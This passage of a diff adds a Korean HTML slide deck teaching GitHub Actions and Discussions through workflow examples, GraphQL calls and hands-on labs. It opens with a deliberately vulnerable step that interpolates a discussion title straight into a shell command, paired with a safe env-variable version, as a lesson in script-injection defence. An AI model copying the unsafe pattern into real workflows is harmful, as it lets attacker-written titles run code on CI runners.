+<pre class="code" data-lang="yaml">- run: echo "${{ github.event.discussion.title }}"</pre>
+      <div class="file">안전: 값이 셸 코드가 아닌 변수로 전달됨</div>
+<pre class="code" data-lang="yaml">- env:
+    TITLE: ${{ github.event.discussion.title }}
+  run: echo "$TITLE"</pre>
+    </div>
+  </div>
+</section>
+
+<!-- ===================== Part 3 ===================== -->
+<section class="slide divider" data-part="Part 3 · Discussions">
+  <span class="num">PART 3</span>
+  <h2>GitHub Discussions</h2>
+  <p>저장소나 조직에 붙는 커뮤니티 포럼. 할 일이 아닌 대화를 위한 공간</p>
+</section>
+
+<section class="slide" data-part="Part 3 · Discussions">
+  <header><div class="eyebrow">What</div><h2>Discussions는 무엇인가: Issues와 비교</h2></header>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th></th><th>Issues</th><th>Discussions</th></tr></thead>
+      <tbody>
+        <tr><td>목적</td><td>해야 할 일: 버그, 기능 작업</td><td>대화: 질문, 아이디어, 공지, 투표</td></tr>
+        <tr><td>끝맺음</td><td>Close (완료 / 계획 없음)</td><td>Q&amp;A는 답변 채택, 나머지는 열린 채 유지 가능</td></tr>
+        <tr><td>구조</td><td>평평한 댓글 목록</td><td>댓글 + 한 단계 답글 스레드, 업보트</td></tr>
+        <tr><td>분류</td><td>라벨, 마일스톤, 프로젝트</td><td>카테고리(필수) + 라벨</td></tr>
+        <tr><td>연결</td><td>PR로 닫기, 개발 브랜치</td><td>Issue ↔ Discussion 서로 전환</td></tr>
+        <tr><td>API</td><td>REST + GraphQL</td><td>GraphQL</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="note"><b>나누는 기준</b> 누군가 작업해서 닫아야 하는 것은 Issue, 여러 사람의 의견이 쌓여야 하는 것은 Discussion.</div>
+</section>
+
+<section class="slide" data-part="Part 3 · Discussions">
+  <header><div class="eyebrow">Categories</div><h2>카테고리와 4가지 형식</h2></header>
+  <div class="grid2">
+    <div class="cell"><span class="tag">Announcement</span><h3>공지</h3><p>메인테이너와 관리자만 새 글을 쓰고, 누구나 댓글을 답니다. 릴리스 안내에 적합.</p></div>
+    <div class="cell"><span class="tag">Question / Answer</span><h3>Q&amp;A</h3><p>댓글 하나를 <b>답변으로 채택</b>할 수 있고, 채택된 답이 글 상단에 고정됩니다.</p></div>
+    <div class="cell"><span class="tag">Open-ended discussion</span><h3>자유 토론</h3><p>아이디어, 잡담, 쇼케이스처럼 결론이 필요 없는 대화.</p></div>
+    <div class="cell"><span class="tag">Poll</span><h3>투표</h3><p>선택지를 두고 커뮤니티 의견을 모읍니다.</p></div>
+  </div>
+  <p class="small muted">Discussions를 켜면 기본 카테고리 Announcements, General, Ideas, Polls, Q&amp;A, Show and tell 이 생깁니다. 이름, 이모지, 형식은 바꿀 수 있고 섹션으로 묶을 수도 있습니다.</p>
+</section>
+
+<section class="slide" data-part="Part 3 · Discussions">
+  <header><div class="eyebrow">Features</div><h2>운영에 쓰는 기능들</h2></header>
+  <div class="cols">
+    <ul class="list">
+      <li><b>답변 채택</b> Q&amp;A에서 작성자나 메인테이너가 <b>Mark as answer</b>.</li>
+      <li><b>업보트와 리액션</b> 좋은 글과 댓글이 위로 올라옵니다.</li>
+      <li><b>고정(Pin)</b> 중요한 글을 목록 상단에 노출. 카테고리별 고정도 가능.</li>
+      <li><b>Issue ↔ Discussion 전환</b> 질문으로 온 이슈를 Discussion으로, 확정된 아이디어를 Issue로.</li>
+      <li><b>조직 Discussions</b> 저장소 하나를 지정해 조직 전체 포럼으로 사용.</li>
+    </ul>
+    <div class="stack">
+      <div class="file">.github/DISCUSSION_TEMPLATE/q-a.yml (파일명 = 카테고리 slug)</div>
+<pre class="code" data-lang="yaml">title: "[질문] "
+labels: ["question"]
+body:
+  - type: dropdown
+    id: topic
+    attributes:
+      label: 주제
+      options: [GitHub Actions, GitHub Discussions]
+  - type: textarea
+    id: question
+    attributes:
+      label: 질문 내용
+    validations:
+      required: true</pre>
+    </div>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 3 · Discussions">
+  <header><div class="eyebrow">How it works</div><h2>Discussions 구동원리: 데이터 모델과 이벤트</h2></header>
+  <div class="pipe">
+    <div class="node"><span class="mono">Repository</span><b>저장소</b><span>Discussions 기능 on/off</span></div>
+    <div class="arrow">→</div>
+    <div class="node"><span class="mono">DiscussionCategory</span><b>카테고리</b><span>형식(공지, Q&amp;A 등)을 가짐</span></div>
+    <div class="arrow">→</div>
+    <div class="node hot"><span class="mono">Discussion</span><b>글</b><span>번호, 제목, 본문, 라벨, 채택된 답변</span></div>
+    <div class="arrow">→</div>
+    <div class="node"><span class="mono">DiscussionComment</span><b>댓글</b><span>업보트, 답변 여부</span></div>
+    <div class="arrow">→</div>
+    <div class="node"><span class="mono">replies</span><b>답글</b><span>댓글 아래 한 단계</span></div>
+  </div>
+  <div class="cols">
+    <div class="stack">
+      <h3>바뀔 때마다 이벤트가 나간다</h3>
+      <p class="small"><code>discussion</code>: created, edited, deleted, answered, unanswered, category_changed, labeled, pinned, locked, transferred 등</p>
+      <p class="small"><code>discussion_comment</code>: created, edited, deleted</p>
+      <p class="small muted">같은 이벤트가 Webhook과 Actions 트리거로 전달됩니다. Actions에서는 기본 브랜치의 워크플로가 실행됩니다.</p>
+    </div>
+    <div class="stack">
+      <h3>읽고 쓰는 것은 GraphQL</h3>
+      <p class="small">조회: <code>repository.discussions</code>, <code>discussionCategories</code></p>
+      <p class="small">쓰기: <code>createDiscussion</code>, <code>addDiscussionComment</code>, <code>markDiscussionCommentAsAnswer</code>, <code>updateDiscussion</code></p>
+      <p class="small muted">ID는 숫자가 아닌 노드 ID(<code>D_kwDO…</code>)를 씁니다. 이벤트 페이로드의 <code>node_id</code>가 바로 그 값입니다.</p>
+    </div>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 3 · Discussions">
+  <header><div class="eyebrow">Actions × Discussions</div><h2>두 기능이 맞물리는 방식</h2></header>
+  <div class="pipe">
+    <div class="node"><span class="mono">사람</span><b>질문 작성</b><span>Q&amp;A 카테고리에 새 Discussion</span></div>
+    <div class="arrow">→</div>
+    <div class="node"><span class="mono">on: discussion</span><b>이벤트</b><span><code>types: [created]</code> 와 일치</span></div>
+    <div class="arrow">→</div>
+    <div class="node hot"><span class="mono">workflow</span><b>러너에서 실행</b><span><code>permissions: discussions: write</code></span></div>
+    <div class="arrow">→</div>
+    <div class="node"><span class="mono">gh api graphql</span><b>API 호출</b><span><code>addDiscussionComment</code></span></div>
+    <div class="arrow">→</div>
+    <div class="node done"><span class="mono">github-actions[bot]</span><b>자동 댓글</b><span>안내 문구와 템플릿 링크</span></div>
+  </div>
+<pre class="code sm" data-lang="yaml">on:
+  discussion:
+    types: [created]
+permissions:
+  discussions: write
+jobs:
+  welcome:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          GH_TOKEN: ${{ github.token }}
+          ID: ${{ github.event.discussion.node_id }}
+        run: |
+          gh api graphql -f id="$ID" -f query='mutation($id: ID!) {
+            addDiscussionComment(input: {discussionId: $id, body: "환영합니다!"}) { comment { url } }
+          }'</pre>
+</section>
+
+<!-- ===================== Part 4 ===================== -->
+<section class="slide divider" data-part="Part 4 · 활용 사례">
+  <span class="num">PART 4</span>
+  <h2>외부 활용 사례</h2>
+  <p>오픈소스 프로젝트와 널리 쓰이는 도구들이 Actions와 Discussions를 쓰는 방식</p>
+</section>
+
+<section class="slide" data-part="Part 4 · 활용 사례">
+  <header><div class="eyebrow">Actions in the wild</div><h2>Actions 활용 사례와 도구</h2></header>
+  <div class="grid3">
+    <div class="cell"><span class="tag">github/codeql-action</span><h3>코드 보안 스캔</h3><p>PR마다 CodeQL로 취약점을 분석해 Security 탭과 PR에 결과를 남깁니다. public 저장소에서 널리 쓰입니다.</p></div>
+    <div class="cell"><span class="tag">googleapis/release-please-action</span><h3>릴리스 자동화</h3><p>Conventional Commits를 읽어 버전, CHANGELOG, 릴리스 PR을 자동으로 만듭니다. Google의 여러 오픈소스 SDK가 사용.</p></div>
+    <div class="cell"><span class="tag">Dependabot + CI</span><h3>의존성 업데이트</h3><p>Dependabot이 버전 업 PR을 열면 CI가 테스트하고, 통과한 패치 버전은 자동 병합하는 패턴.</p></div>
+    <div class="cell"><span class="tag">actions/deploy-pages</span><h3>문서·사이트 배포</h3><p>정적 사이트를 빌드해 GitHub Pages에 배포. 이 슬라이드도 Lab 4에서 같은 방식으로 배포합니다.</p></div>
+    <div class="cell"><span class="tag">actions/stale</span><h3>이슈 정리</h3><p>오래 반응이 없는 이슈와 PR에 라벨을 붙이고 경고 후 닫습니다. 대형 오픈소스의 트리아지 부담을 줄입니다.</p></div>
+    <div class="cell"><span class="tag">super-linter/super-linter</span><h3>멀티 언어 린트</h3><p>여러 언어의 린터를 하나의 액션으로 실행. 저장소 전체의 코드 스타일을 PR 단계에서 맞춥니다.</p></div>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 4 · 활용 사례">
+  <header><div class="eyebrow">Discussions in the wild</div><h2>Discussions 활용 사례</h2></header>
+  <div class="grid2">
+    <div class="cell"><span class="tag">github.com/orgs/community/discussions</span><h3>GitHub Community</h3><p>GitHub 자신이 제품 피드백과 사용자 Q&amp;A 포럼으로 운영. 조직 Discussions의 대표 사례입니다.</p></div>
+    <div class="cell"><span class="tag">vercel/next.js · discussions</span><h3>Next.js</h3><p>사용 질문과 기능 아이디어를 Discussions로 받고, Issues는 재현 가능한 버그에 집중합니다.</p></div>
+    <div class="cell"><span class="tag">tailwindlabs/tailwindcss · discussions</span><h3>Tailwind CSS</h3><p>도움 요청과 아이디어를 카테고리로 나눠 받고, 질문으로 들어온 이슈를 Discussion으로 옮깁니다.</p></div>
+    <div class="cell"><span class="tag">giscus</span><h3>블로그 댓글 시스템</h3><p>블로그 글마다 Discussion을 하나씩 연결해 댓글 저장소로 사용. GitHub 로그인으로 댓글을 답니다.</p></div>
+  </div>
+  <p class="small muted">공통점: Issues 트래커를 작업 목록으로 깨끗하게 유지하고, 질문과 토론은 Discussions로 흘려보냅니다.</p>
+</section>
+
+<section class="slide" data-part="Part 4 · 활용 사례">
+  <header><div class="eyebrow">Patterns</div><h2>두 기능을 함께 쓰는 운영 패턴</h2></header>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>패턴</th><th>트리거</th><th>워크플로가 하는 일</th></tr></thead>
+      <tbody>
+        <tr><td>릴리스 공지</td><td><code>release: published</code></td><td>Announcements 카테고리에 릴리스 노트로 Discussion 생성 (Lab 7)</td></tr>
+        <tr><td>신규 글 안내</td><td><code>discussion: created</code></td><td>환영 댓글, 질문 템플릿·문서 링크 안내 (Lab 6)</td></tr>
+        <tr><td>답변 감사</td><td><code>discussion: answered</code></td><td>채택된 답변 작성자에게 감사 댓글, 라벨 정리</td></tr>
+        <tr><td>버그 승격</td><td><code>discussion: labeled</code></td><td><code>bug</code> 라벨이 붙으면 Issue를 만들고 링크를 남김</td></tr>
+        <tr><td>주간 요약</td><td><code>schedule: cron</code></td><td>지난주 미답변 Q&amp;A를 모아 요약 Discussion 게시</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <p class="small muted">릴리스 페이지에서 "Create a discussion for this release"를 체크하면 워크플로 없이도 릴리스 Discussion을 만들 수 있습니다.</p>
+</section>
+
+<!-- ===================== Part 5 ===================== -->
+<section class="slide divider" data-part="Part 5 · 실습">
+  <span class="num">PART 5</span>
+  <h2>실습</h2>
+  <p>저장소에 들어 있는 워크플로를 실행하고, 고치고, 깨뜨리며 익힙니다.</p>
+</section>
+
+<section class="slide" data-part="Part 5 · 실습">
+  <header><div class="eyebrow">Lab map</div><h2>실습 지도</h2></header>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>Lab</th><th>배우는 것</th><th>파일</th></tr></thead>
+      <tbody>
+        <tr><td>0 · 준비</td><td>저장소 복제, Actions 탭 켜기</td><td class="mono">README.md</td></tr>
+        <tr><td>1 · Hello</td><td>수동 실행, 입력값, 로그와 요약</td><td class="mono">01-hello.yml</td></tr>
+        <tr><td>2 · CI</td><td>matrix, PR 체크, 실패 고치기</td><td class="mono">02-ci.yml, labs/sample-app</td></tr>
+        <tr><td>3 · Artifact</td><td>잡 연결, outputs, 아티팩트</td><td class="mono">03-artifact.yml</td></tr>
+        <tr><td>4 · Pages</td><td>권한, environment, 슬라이드 배포</td><td class="mono">04-pages.yml</td></tr>
+        <tr><td>5 · Discussions</td><td>기능 켜기, 카테고리, 템플릿, 답변 채택</td><td class="mono">DISCUSSION_TEMPLATE/q-a.yml</td></tr>
+        <tr><td>6 · 자동 댓글</td><td>discussion 이벤트, GraphQL 쓰기</td><td class="mono">05-discussion-welcome.yml</td></tr>
+        <tr><td>7 · 공지 게시</td><td>ID 조회, createDiscussion</td><td class="mono">06-announce.yml</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 5 · 실습">
+  <header><span class="lab-badge">LAB 0</span><h2>준비: 내 저장소에서 Actions 켜기</h2></header>
+  <div class="cols">
+    <ol class="steps">
+      <li><b>github.com/ljd6805/github-actions-discussions-study</b> 를 엽니다. 스터디원은 오른쪽 위 <b>Fork</b> 로 자기 계정에 복제합니다.</li>
+      <li>Fork한 저장소의 <b>Actions</b> 탭에서 <b>I understand my workflows, go ahead and enable them</b> 을 누릅니다. Fork는 기본으로 워크플로가 꺼져 있습니다.</li>
+      <li>왼쪽 목록에 01~06 워크플로가 보이면 준비 완료입니다.</li>
+      <li>(선택) 로컬에 clone 해 두면 Lab 2에서 코드를 고치기 편합니다.</li>
+    </ol>
+<pre class="code sm" data-lang="bash">git clone https://github.com/&lt;계정&gt;/github-actions-discussions-study
+cd github-actions-discussions-study
+tree -a -L 3 .github labs</pre>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 5 · 실습">
+  <header><span class="lab-badge">LAB 1</span><h2>Hello Actions: 수동 실행과 로그 읽기</h2></header>
+  <div class="cols wide-left">
+    <div class="stack">
+      <div class="file">.github/workflows/01-hello.yml</div>
+<pre class="code sm" data-lang="yaml">on:
+  workflow_dispatch:
+    inputs:
+      who:
+        description: 인사할 대상
+        default: 스터디원
+jobs:
+  hello:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 인사하기
+        env:
+          WHO: ${{ inputs.who || '스터디원' }}
+        run: echo "안녕하세요, ${WHO}님!"
+      - name: 실행 정보 보기
+        run: |
+          echo "이벤트:  ${{ github.event_name }}"
+          echo "러너 OS: $RUNNER_OS"
+      - run: echo "### ${{ github.actor }}" >> "$GITHUB_STEP_SUMMARY"</pre>
+    </div>
+    <ol class="steps">
+      <li>Actions → <b>01 Hello Actions</b> → <b>Run workflow</b>, <code>who</code> 에 내 이름 입력.</li>
+      <li>실행을 열고 잡 → 스텝을 펼쳐 출력을 확인합니다.</li>
+      <li>실행 요약 페이지 아래의 Summary 표를 확인합니다.</li>
+      <li><b>과제</b> <code>runs-on</code>을 <code>windows-latest</code>로 바꿔 커밋하고 <code>RUNNER_OS</code> 출력이 어떻게 바뀌는지 봅니다.</li>
+    </ol>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 5 · 실습">
+  <header><span class="lab-badge">LAB 2</span><h2>matrix CI: 일부러 깨뜨리고 PR에서 고치기</h2></header>
+  <div class="cols">
+    <div class="stack">
+      <div class="file">.github/workflows/02-ci.yml (발췌)</div>
+<pre class="code" data-lang="yaml">strategy:
+  fail-fast: false
+  matrix:
+    os: [ubuntu-latest, windows-latest]
+    node: [20, 22]
+defaults:
+  run:
+    working-directory: labs/sample-app
+steps:
+  - uses: actions/checkout@v4
+  - uses: actions/setup-node@v4
+    with:
+      node-version: ${{ matrix.node }}
+  - run: npm test</pre>
+    </div>
+    <ol class="steps">
+      <li>새 브랜치 <code>lab2-break</code> 를 만듭니다.</li>
+      <li><code>labs/sample-app/src/math.js</code> 의 <code>add</code>를 <code>a - b</code>로 바꿔 커밋합니다.</li>
+      <li>PR을 열면 2 OS × 2 Node = <b>4개 잡</b>이 동시에 돌고 모두 빨간색이 됩니다.</li>
+      <li>실패 로그에서 어떤 테스트가 깨졌는지 찾습니다.</li>
+      <li>코드를 되돌려 push하면 같은 PR의 체크가 초록색으로 바뀝니다.</li>
+      <li><b>과제</b> matrix에 <code>node: 24</code>를 추가하면 잡이 몇 개가 될까요?</li>
+    </ol>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 5 · 실습">
+  <header><span class="lab-badge">LAB 3</span><h2>잡 연결: outputs와 아티팩트</h2></header>
+  <div class="cols wide-left">
+<pre class="code" data-lang="yaml">jobs:
+  build:
+    outputs:
+      built-at: ${{ steps.meta.outputs.time }}
+    steps:
+      - uses: actions/checkout@v4
+      - id: meta
+        run: echo "time=$(date -u +%FT%TZ)" >> "$GITHUB_OUTPUT"
+      - run: mkdir -p dist && cp -r slides dist/
+      - uses: actions/upload-artifact@v4
+        with: { name: site, path: dist, retention-days: 3 }
+  report:
+    needs: build
+    steps:
+      - uses: actions/download-artifact@v4
+        with: { name: site, path: site }
+      - run: |
+          ls -R site
+          echo "빌드 시각: ${{ needs.build.outputs.built-at }}"</pre>
+    <ol class="steps">
+      <li><b>03 Artifact &amp; Job 연결</b> 을 수동 실행합니다.</li>
+      <li>실행 그래프에서 build → report 화살표를 확인합니다.</li>
+      <li>report 로그에 build 잡이 만든 시각이 찍히는지 봅니다.</li>
+      <li>실행 페이지 하단 <b>Artifacts</b> 에서 <code>site</code> 를 내려받아 봅니다.</li>
+      <li><b>생각해 보기</b> report 잡에서 <code>ls dist</code> 를 하면 왜 비어 있을까요?</li>
+    </ol>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 5 · 실습">
+  <header><span class="lab-badge">LAB 4</span><h2>GitHub Pages로 이 슬라이드 배포하기</h2></header>
+  <div class="cols">
+    <ol class="steps">
+      <li><b>Settings → Pages → Build and deployment → Source</b> 를 <b>GitHub Actions</b> 로 바꿉니다.</li>
+      <li>Actions → <b>04 Deploy slides to Pages</b> → Run workflow.</li>
+      <li>잡 상단의 <code>github-pages</code> 환경 링크를 눌러 배포된 슬라이드를 엽니다.<br><span class="mono small muted">https://&lt;계정&gt;.github.io/github-actions-discussions-study/</span></li>
+      <li><b>과제</b> 워크플로의 <code>push</code> 주석을 풀고, <code>slides/index.html</code> 의 표지 문구를 바꿔 push하면 자동 배포되는지 확인합니다.</li>
+    </ol>
+<pre class="code" data-lang="yaml">permissions:
+  contents: read
+  pages: write      # Pages에 올리기
+  id-token: write   # 배포 출처 증명(OIDC)
+jobs:
+  deploy:
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/configure-pages@v5
+      - uses: actions/upload-pages-artifact@v3
+        with: { path: slides }
+      - id: deployment
+        uses: actions/deploy-pages@v4</pre>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 5 · 실습">
+  <header><span class="lab-badge">LAB 5</span><h2>Discussions 켜고 운영해 보기</h2></header>
+  <div class="cols">
+    <ol class="steps">
+      <li><b>Settings → General → Features</b> 에서 <b>Discussions</b> 를 체크하고 <b>Set up discussions</b> 로 첫 글을 만듭니다.</li>
+      <li>Discussions 탭 → 카테고리 연필 아이콘에서 기본 카테고리 6개와 각 형식을 확인합니다.</li>
+      <li><b>Q&amp;A</b> 에서 New discussion을 누르면 저장소의 <code>q-a.yml</code> 템플릿 폼이 나옵니다. 질문을 하나 올립니다.</li>
+      <li>다른 계정(또는 스터디원)이 답을 달면 <b>Mark as answer</b> 로 채택합니다.</li>
+      <li>글 하나를 <b>Pin</b> 하고, 다른 글은 <b>Create issue from discussion</b> 으로 Issue로 만들어 봅니다.</li>
+    </ol>
+    <div class="stack">
+      <div class="note"><b>템플릿 규칙</b> 파일 이름이 카테고리 slug와 같아야 적용됩니다. Q&amp;A의 slug는 <code>q-a</code>, Ideas는 <code>ideas</code>. slug는 카테고리 페이지 URL 끝에서 확인할 수 있습니다.</div>
+      <div class="cell"><span class="tag">점검</span><p>Q&amp;A 목록에서 채택된 글에 초록 체크가 보이나요? Issue로 만든 글 상단에 연결 링크가 생겼나요?</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 5 · 실습">
+  <header><span class="lab-badge">LAB 6</span><h2>새 Discussion에 자동 환영 댓글 달기</h2></header>
+  <div class="cols wide-left">
+    <div class="stack">
+      <div class="file">.github/workflows/05-discussion-welcome.yml (발췌)</div>
+<pre class="code sm" data-lang="yaml">on:
+  discussion:
+    types: [created]
+permissions:
+  discussions: write
+jobs:
+  welcome:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          GH_TOKEN: ${{ github.token }}
+          DISCUSSION_ID: ${{ github.event.discussion.node_id }}
+          AUTHOR: ${{ github.event.discussion.user.login }}
+        run: |
+          gh api graphql -f query='
+            mutation($id: ID!, $body: String!) {
+              addDiscussionComment(input: {discussionId: $id, body: $body}) {
+                comment { url }
+              }
+            }' -f id="$DISCUSSION_ID" \
+               -f body="@$AUTHOR 님 환영합니다!"</pre>
+    </div>
+    <ol class="steps">
+      <li>Lab 5가 끝나 Discussions가 켜져 있어야 합니다.</li>
+      <li>General 카테고리에 아무 글이나 올립니다.</li>
+      <li>Actions 탭에서 <b>05 Discussion 환영 댓글</b> 실행을 확인합니다.</li>
+      <li>글로 돌아가 <code>github-actions</code> 봇의 댓글을 확인합니다.</li>
+      <li><b>과제</b> <code>types</code>에 <code>answered</code>를 추가하고, 답변이 채택되면 감사 댓글을 달도록 바꿔 봅니다. 힌트: <code>github.event.action</code></li>
+    </ol>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 5 · 실습">
+  <header><span class="lab-badge">LAB 7</span><h2>워크플로로 공지 Discussion 게시하기</h2></header>
+  <div class="cols wide-left">
+<pre class="code sm" data-lang="yaml">- name: 저장소와 카테고리 ID 조회
+  id: ids
+  run: |
+    gh api graphql -f query='query($owner: String!, $name: String!) {
+      repository(owner: $owner, name: $name) {
+        id
+        discussionCategories(first: 25) { nodes { id name } }
+      }
+    }' -f owner="$OWNER" -f name="$NAME" > repo.json
+    REPO_ID=$(jq -r '.data.repository.id' repo.json)
+    echo "repo=$REPO_ID" >> "$GITHUB_OUTPUT"
+    ...
+- name: Discussion 만들기
+  run: |
+    gh api graphql -f query='mutation($repo: ID!, $cat: ID!,
+        $title: String!, $body: String!) {
+      createDiscussion(input: {repositoryId: $repo,
+        categoryId: $cat, title: $title, body: $body}) {
+        discussion { url }
+      }
+    }' -f repo="$REPO_ID" -f cat="$CAT_ID" ...</pre>
+    <ol class="steps">
+      <li>Actions → <b>06 공지 Discussion 게시</b> → Run workflow. 제목과 본문을 입력합니다.</li>
+      <li>실행 Summary에 찍힌 URL로 Announcements의 새 글을 엽니다.</li>
+      <li><b>관찰</b> Lab 6의 환영 댓글 워크플로가 이번에는 <b>실행되지 않습니다</b>. <code>GITHUB_TOKEN</code>으로 만든 이벤트는 다른 워크플로를 깨우지 않기 때문입니다.</li>
+      <li><b>과제</b> 트리거를 <code>release: types: [published]</code> 로 바꾸고 릴리스 본문을 공지 본문으로 써 보세요.</li>
+    </ol>
+  </div>
+</section>
+
+<section class="slide" data-part="Part 5 · 실습">
+  <header><div class="eyebrow">Troubleshooting</div><h2>막혔을 때 먼저 볼 것</h2></header>
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>증상</th><th>원인과 해결</th></tr></thead>
+      <tbody>
+        <tr><td>Run workflow 버튼이 없다</td><td><code>workflow_dispatch</code> 가 있는 파일이 <b>기본 브랜치</b>에 있어야 버튼이 나타납니다.</td></tr>
+        <tr><td>Fork에서 아무것도 안 돈다</td><td>Fork는 워크플로가 꺼져 있습니다. Actions 탭에서 활성화하세요.</td></tr>
+        <tr><td><code>Resource not accessible by integration</code></td><td>토큰 권한 부족. <code>permissions:</code> 에 필요한 범위(예: <code>discussions: write</code>)를 추가합니다.</td></tr>
+        <tr><td>Pages 배포가 실패한다</td><td>Settings → Pages의 Source가 <b>GitHub Actions</b> 인지 확인합니다.</td></tr>
+        <tr><td>Discussion 워크플로가 안 돈다</td><td>Discussions가 꺼져 있거나, 워크플로 파일이 기본 브랜치에 없거나, 글을 봇 토큰으로 만들었습니다.</td></tr>
+        <tr><td>카테고리를 찾지 못했다</td><td>입력한 카테고리 이름이 화면의 이름과 정확히 같은지(대소문자 포함) 확인합니다.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section class="slide" data-part="정리">
+  <header><div class="eyebrow">Wrap-up</div><h2>정리와 다음 단계</h2></header>
+  <div class="cols">
+    <div class="stack">
+      <h3>오늘 익힌 것</h3>
+      <ul class="list small">
+        <li>이벤트 → 워크플로 → 잡 → 스텝 → 러너의 실행 흐름</li>
+        <li>matrix, needs, outputs, 아티팩트로 잡을 엮는 법</li>
+        <li><code>GITHUB_TOKEN</code> 최소 권한과 스크립트 인젝션 방어</li>
+        <li>Discussions 카테고리, 템플릿, 답변 채택</li>
+        <li>discussion 이벤트와 GraphQL로 운영 자동화</li>
+      </ul>
+    </div>
+    <div class="stack">
+      <h3>더 해 볼 것</h3>
+      <ul class="list small">
+        <li>Lab 6·7 과제로 "답변 감사"와 "릴리스 공지" 완성하기</li>
+        <li>자주 쓰는 스텝을 composite action으로 묶기</li>
+        <li>스터디 질문을 이 저장소 Q&amp;A에 올리고 서로 답변 채택하기</li>
+      </ul>
+      <h3 style="margin-top:8px">참고 자료</h3>
+      <ul class="list small">
+        <li><a href="https://docs.github.com/actions" target="_blank" rel="noopener">docs.github.com/actions</a></li>
+        <li><a href="https://docs.github.com/discussions" target="_blank" rel="noopener">docs.github.com/discussions</a></li>
+        <li><a href="https://skills.github.com" target="_blank" rel="noopener">skills.github.com</a> (GitHub 공식 실습 코스)</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+  </main>
+</div>
+
+<script>
+(function () {
+  // Light YAML/bash highlighter: escape first, then wrap tokens.
+  function esc(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
+  function hiText(t) {
+    return esc(t).replace(/(\$\{\{[^}]*\}\})|("[^"]*")|('[^']*')/g, function (m, expr) {
+      return '<span class="' + (expr ? 'e' : 's') + '">' + m + '</span>';
+    });
+  }
+  function hiLine(line) {
+    var comment = '';
+    var ci = line.search(/(^|\s)#(\s|$)/);
+    if (ci >= 0 && (line.slice(0, ci).split('"').length % 2 === 1) && (line.slice(0, ci).split("'").length % 2 === 1)) {
+      comment = line.slice(ci); line = line.slice(0, ci);
+    }
+    var out;
+    var km = line.match(/^(\s*-?\s*)([A-Za-z0-9_.\-]+)(:)(\s.*)?$/);
+    if (km) out = esc(km[1]) + '<span class="k">' + esc(km[2]) + '</span>:' + hiText(km[4] || '');
+    else out = hiText(line);
+    if (comment) out += '<span class="c">' + esc(comment) + '</span>';
+    return out;
+  }
+  document.querySelectorAll('pre.code').forEach(function (pre) {
+    var text = pre.textContent;
+    pre.innerHTML = text.split('\n').map(hiLine).join('\n');
+  });
+
+  var slides = Array.prototype.slice.call(document.querySelectorAll('.slide'));
+  var stage = document.getElementById('stage');
+  var count = document.getElementById('count');
+  var prog = document.getElementById('prog');
+  var partLabel = document.getElementById('partLabel');
+  var reader = window.matchMedia('(max-width: 760px), (max-height: 440px)');
+  var i = 0;
+
+  function fit() {
+    if (reader.matches) return;
+    var s = Math.min((stage.clientWidth - 32) / 1280, (stage.clientHeight - 32) / 720);
+    document.documentElement.style.setProperty('--s', Math.max(s, 0.1));
+  }
+  function go(n) {
+    i = Math.max(0, Math.min(slides.length - 1, n));
+    slides.forEach(function (el, k) { el.classList.toggle('active', k === i); });
+    count.textContent = (i + 1) + ' / ' + slides.length;
+    prog.style.width = ((i + 1) / slides.length * 100) + '%';
+    partLabel.textContent = slides[i].getAttribute('data-part') || '';
+    try { history.replaceState(null, '', '#s' + (i + 1)); } catch (e) {}
+  }
+  var start = /^#s(\d+)$/.exec(location.hash);
+  go(start ? parseInt(start[1], 10) - 1 : 0);
+  fit();
+  window.addEventListener('resize', fit);
+  if (reader.addEventListener) reader.addEventListener('change', fit);
+
+  document.getElementById('prevBtn').addEventListener('click', function () { go(i - 1); });
+  document.getElementById('nextBtn').addEventListener('click', function () { go(i + 1); });
+  document.getElementById('fsBtn').addEventListener('click', function () {
+    var el = document.documentElement;
+    try {
+      var p = document.fullscreenElement ? document.exitFullscreen() : el.requestFullscreen();
+      if (p && p.catch) p.catch(function () {});
+    } catch (e) {}
+  });
+  document.addEventListener('fullscreenchange', function () { setTimeout(fit, 50); });
+  document.addEventListener('keydown', function (e) {
+    if (reader.matches || e.altKey || e.ctrlKey || e.metaKey) return;
+    var k = e.key;
+    if (k === 'ArrowRight' || k === 'PageDown' || k === ' ') { e.preventDefault(); go(i + 1); }
+    else if (k === 'ArrowLeft' || k === 'PageUp') { e.preventDefault(); go(i - 1); }
+    else if (k === 'Home') { go(0); }
+    else if (k === 'End') { go(slides.length - 1); }
+    else if (k === 'f' || k === 'F') { document.getElementById('fsBtn').click(); }
+  });
+  stage.addEventListener('click', function (e) {
+    if (reader.matches || e.target.closest('a, button, pre, table')) return;
+    var r = stage.getBoundingClientRect();
+    go(e.clientX - r.left > r.width / 2 ? i + 1 : i - 1);
+  });
+})();
+</script>
+</body>
+</html>
